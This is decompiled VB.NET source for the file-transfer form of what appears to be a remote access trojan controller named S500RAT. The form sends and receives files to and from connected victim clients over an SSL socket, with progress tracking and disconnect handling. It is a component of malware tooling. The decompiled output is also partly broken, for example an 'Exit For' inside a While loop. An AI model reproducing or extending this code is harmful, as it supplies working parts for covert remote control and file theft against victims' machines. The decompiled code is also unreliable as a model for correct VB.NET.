Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Drawing.Text
Imports System.IO
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000019 RID: 25
	<DesignerGenerated()>
	Public Partial Class FormDownloadFile
		Inherits Form

		' Token: 0x06000282 RID: 642 RVA: 0x00014D24 File Offset: 0x00012F24
		Public Sub New()
			AddHandler MyBase.Closed, AddressOf Me.FormDownloadFile_Closed
			AddHandler MyBase.Load, AddressOf Me.FormDownloadFile_Load
			AddHandler MyBase.Resize, AddressOf Me.FormDownloadFile_Resize
			Me.IsConnected = False
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x17000113 RID: 275
		' (get) Token: 0x06000285 RID: 645 RVA: 0x000157C9 File Offset: 0x000139C9
		' (set) Token: 0x06000286 RID: 646 RVA: 0x000157D3 File Offset: 0x000139D3
		Public Overridable Property labelfile As Label

		' Token: 0x17000114 RID: 276
		' (get) Token: 0x06000287 RID: 647 RVA: 0x000157DC File Offset: 0x000139DC
		' (set) Token: 0x06000288 RID: 648 RVA: 0x000157E6 File Offset: 0x000139E6
		Public Overridable Property labelsize As Label

		' Token: 0x17000115 RID: 277
		' (get) Token: 0x06000289 RID: 649 RVA: 0x000157EF File Offset: 0x000139EF
		' (set) Token: 0x0600028A RID: 650 RVA: 0x000157F9 File Offset: 0x000139F9
		Private Overridable Property label3 As Label

		' Token: 0x17000116 RID: 278
		' (get) Token: 0x0600028B RID: 651 RVA: 0x00015802 File Offset: 0x00013A02
		' (set) Token: 0x0600028C RID: 652 RVA: 0x0001580C File Offset: 0x00013A0C
		Friend Overridable Property Guna2AnimateWindow1 As Guna2AnimateWindow

		' Token: 0x17000117 RID: 279
		' (get) Token: 0x0600028D RID: 653 RVA: 0x00015815 File Offset: 0x00013A15
		' (set) Token: 0x0600028E RID: 654 RVA: 0x0001581F File Offset: 0x00013A1F
		Public Overridable Property NameForm As UILabel

		' Token: 0x17000118 RID: 280
		' (get) Token: 0x0600028F RID: 655 RVA: 0x00015828 File Offset: 0x00013A28
		' (set) Token: 0x06000290 RID: 656 RVA: 0x00015832 File Offset: 0x00013A32
		Public Overridable Property ClientInfo As Label

		' Token: 0x17000119 RID: 281
		' (get) Token: 0x06000291 RID: 657 RVA: 0x0001583B File Offset: 0x00013A3B
		' (set) Token: 0x06000292 RID: 658 RVA: 0x00015845 File Offset: 0x00013A45
		Friend Overridable Property ProgressBar1 As Guna2ProgressBar

		' Token: 0x1700011A RID: 282
		' (get) Token: 0x06000293 RID: 659 RVA: 0x0001584E File Offset: 0x00013A4E
		' (set) Token: 0x06000294 RID: 660 RVA: 0x00015858 File Offset: 0x00013A58
		Public Overridable Property Timer1 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x1700011B RID: 283
		' (get) Token: 0x06000295 RID: 661 RVA: 0x0001589B File Offset: 0x00013A9B
		' (set) Token: 0x06000296 RID: 662 RVA: 0x000158A5 File Offset: 0x00013AA5
		Public Overridable Property Label2 As Label

		' Token: 0x1700011C RID: 284
		' (get) Token: 0x06000297 RID: 663 RVA: 0x000158AE File Offset: 0x00013AAE
		' (set) Token: 0x06000298 RID: 664 RVA: 0x000158B8 File Offset: 0x00013AB8
		Friend Overridable Property DownloadLogs As LinkLabel

		' Token: 0x1700011D RID: 285
		' (get) Token: 0x06000299 RID: 665 RVA: 0x000158C1 File Offset: 0x00013AC1
		' (set) Token: 0x0600029A RID: 666 RVA: 0x000158CC File Offset: 0x00013ACC
		Friend Overridable Property Timer2 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer2_Tick
				Dim timer As Timer = Me._Timer2
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer2 = value
				timer = Me._Timer2
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x1700011E RID: 286
		' (get) Token: 0x0600029B RID: 667 RVA: 0x0001590F File Offset: 0x00013B0F
		' (set) Token: 0x0600029C RID: 668 RVA: 0x00015919 File Offset: 0x00013B19
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x1700011F RID: 287
		' (get) Token: 0x0600029D RID: 669 RVA: 0x00015922 File Offset: 0x00013B22
		' (set) Token: 0x0600029E RID: 670 RVA: 0x0001592C File Offset: 0x00013B2C
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x17000120 RID: 288
		' (get) Token: 0x0600029F RID: 671 RVA: 0x00015935 File Offset: 0x00013B35
		' (set) Token: 0x060002A0 RID: 672 RVA: 0x0001593F File Offset: 0x00013B3F
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x17000121 RID: 289
		' (get) Token: 0x060002A1 RID: 673 RVA: 0x00015948 File Offset: 0x00013B48
		' (set) Token: 0x060002A2 RID: 674 RVA: 0x00015954 File Offset: 0x00013B54
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x060002A3 RID: 675 RVA: 0x00015998 File Offset: 0x00013B98
		Private Sub SocketDownload_FormClosed(sender As Object, e As FormClosedEventArgs)
			Try
				Dim client As Clients = Me.Client
				Dim flag As Boolean = client IsNot Nothing
				If flag Then
					client.Disconnected()
				End If
				Dim timer As Timer = Me.Timer1
				Dim flag2 As Boolean = timer IsNot Nothing
				If flag2 Then
					timer.Dispose()
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060002A4 RID: 676 RVA: 0x000159F8 File Offset: 0x00013BF8
		Public Sub Send(obj As Object)
			Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.Client.SendSync)
			Dim obj2 As Object = objectValue
			ObjectFlowControl.CheckForSyncLockOnValueType(obj2)
			SyncLock obj2
				Try
					Me.IsUpload = True
					Dim array As Byte() = CType(obj, Byte())
					Dim bytes As Byte() = BitConverter.GetBytes(array.Length)
					Me.Client.TcpClient.Poll(-1, SelectMode.SelectWrite)
					Me.Client.SslClient.Write(bytes, 0, bytes.Length)
					Using memoryStream As MemoryStream = New MemoryStream(array)
						memoryStream.Position = 0L
						Dim array2 As Byte() = New Byte(49999) {}
						While True
							Dim num As Integer = memoryStream.Read(array2, 0, array2.Length)
							Dim num2 As Integer = num
							Dim flag2 As Boolean = num <= 0
							If flag2 Then
								Exit For
							End If
							Me.Client.TcpClient.Poll(-1, SelectMode.SelectWrite)
							Me.Client.SslClient.Write(array2, 0, num2)
							Dim ptr As Long = Me.BytesSent
							Me.BytesSent = ptr + CLng(num2)
						End While
					End Using
					DataB.form1_0.BeginInvoke(New MethodInvoker(Sub()
						MyBase.Close()
					End Sub))
				Catch ex As Exception
					Dim client As Clients = Me.Client
					Dim flag3 As Boolean = client IsNot Nothing
					If flag3 Then
						client.Disconnected()
					End If
					DataB.form1_0.BeginInvoke(New MethodInvoker(Sub()
						Me.DownloadLogs.Text = "Error"
						Me.DownloadLogs.ForeColor = Color.Red
					End Sub))
				End Try
			End SyncLock
		End Sub

		' Token: 0x060002A5 RID: 677 RVA: 0x00015BBC File Offset: 0x00013DBC
		Private Sub FormDownloadFile_Closed(sender As Object, e As EventArgs)
			Try
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				Dim timer As Timer = Me.Timer1
				If timer IsNot Nothing Then
					timer.Dispose()
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060002A6 RID: 678 RVA: 0x00015C10 File Offset: 0x00013E10
		Private Sub FormDownloadFile_Load(sender As Object, e As EventArgs)
			Try
				Me.MinimumSize = MyBase.Size
				Me.MaximumSize = MyBase.Size
				Me.NameForm.Text = Me.DownloadName
				Me.ClientInfo.Text = Me.Info
			Catch ex As Exception
			End Try
			Me.FormSize = True
		End Sub

		' Token: 0x060002A7 RID: 679 RVA: 0x00015C88 File Offset: 0x00013E88
		Private Sub FormDownloadFile_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x060002A8 RID: 680 RVA: 0x00015D1C File Offset: 0x00013F1C
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Dim isConnected As Boolean = Me.IsConnected
			If isConnected Then
				Dim flag As Boolean = Not Me.IsUpload
				If flag Then
					Me.labelsize.Text = Functions.BytesToSize(Me.FileSize)
					Me.ProgressBar1.Maximum = CInt(Me.FileSize)
					Me.ProgressBar1.Value = CInt(Me.Client.BytesRecevied)
					Dim flag2 As Boolean = Me.Client.BytesRecevied >= Me.FileSize
					If flag2 Then
						Me.Timer1.[Stop]()
					End If
				Else
					Me.labelsize.Text = Functions.BytesToSize(Me.FileSize)
					Me.ProgressBar1.Maximum = CInt(Me.FileSize)
					Me.ProgressBar1.Value = CInt(Me.Client.BytesRecevied)
					Dim flag3 As Boolean = Me.BytesSent >= Me.FileSize
					If flag3 Then
						Me.Timer1.[Stop]()
					End If
				End If
			End If
		End Sub

		' Token: 0x060002A9 RID: 681 RVA: 0x00015E1C File Offset: 0x0001401C
		Private Sub Timer2_Tick(sender As Object, e As EventArgs)
			Dim isConnected As Boolean = Me.IsConnected
			If isConnected Then
				Try
					Dim flag As Boolean = Not Me.Client.TcpClient.Connected
					If flag Then
						MyBase.Close()
					End If
				Catch ex As Exception
					MyBase.Close()
				End Try
			End If
		End Sub

		' Token: 0x060002AA RID: 682 RVA: 0x00015E80 File Offset: 0x00014080
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			MyBase.Close()
		End Sub

		' Token: 0x04000133 RID: 307
		Public F As FormS500

		' Token: 0x04000134 RID: 308
		Public Client As Clients

		' Token: 0x04000135 RID: 309
		Public FileSize As Long

		' Token: 0x04000136 RID: 310
		Private BytesSent As Long

		' Token: 0x04000137 RID: 311
		Public FullFileName As String

		' Token: 0x04000138 RID: 312
		Public ClientFullFileName As String

		' Token: 0x04000139 RID: 313
		Private IsUpload As Boolean

		' Token: 0x0400013A RID: 314
		Public DirPath As String

		' Token: 0x0400013B RID: 315
		Public DownloadName As String

		' Token: 0x0400013C RID: 316
		Public Info As String

		' Token: 0x0400013D RID: 317
		Public IsConnected As Boolean

		' Token: 0x0400013E RID: 318
		Private FormSize As Boolean
	End Class
End Namespace
